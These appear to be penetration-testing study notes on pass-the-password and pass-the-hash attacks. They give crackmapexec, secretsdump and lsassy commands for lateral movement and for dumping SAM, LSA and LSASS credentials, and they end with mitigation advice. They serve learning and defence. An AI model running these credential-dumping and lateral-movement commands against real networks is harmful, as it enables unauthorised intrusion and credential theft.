What are pass attacks? (Pass the Password/Pass the Hash)

If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks

![[Pasted image 20240828172033.png]]

We will primarily use a tool called crackmapexec whose syntax will look something like this:

```bash
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
```

![[Pasted image 20240828172250.png]]

Lets say we have some hashes that we got from metasploit after running hashdump

![[Pasted image 20240828172414.png]]

 Or we can use a tool called secretsdump like so:

```bash
secretsdump.py <DC>/<user>:<password> @ <ip_of_DC>
```

We can then use crackmapexec to pass the hash as well by this command:

```bash
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth
```

![[Pasted image 20240828172648.png]]

We can additionally use crackmapexec to dump valuable data:

```bash
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam (or --shares, --lsa)
```

![[Pasted image 20240828172805.png]]

It even has built in modules...

```bash
crackmapexec smb -L
```

![[Pasted image 20240828172932.png]]

For example, we can dump the lsass with lsassy

```bash
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy
```

![[Pasted image 20240828173043.png]]

There is also a database for crackmapexec which tells you how many attempts a user has made to login and stuff

```bash
cmedb
```

![[Pasted image 20240828173156.png]]

Mitigation:

It is hard to completely prevent, but we can make it more difficult on a hacker:

1) Limit account re-use:
	1) Avoid re-using local admin password
	2) Disable Guest and Administrator accounts
	3) Limit who is a local administrator(least privilege)
2) Utilize strong passwords:
	1) The longer the better (>14 characters)
	2) Avoid using common words
	3) I like long sentences
3) Privilege Access Management(PAM):
	1) Check out/in sensitive accounts when needed
	2) Automatically rotate passwords on check out and check in
	3) Limits pass attacks as hash/password is strong and constantly rotated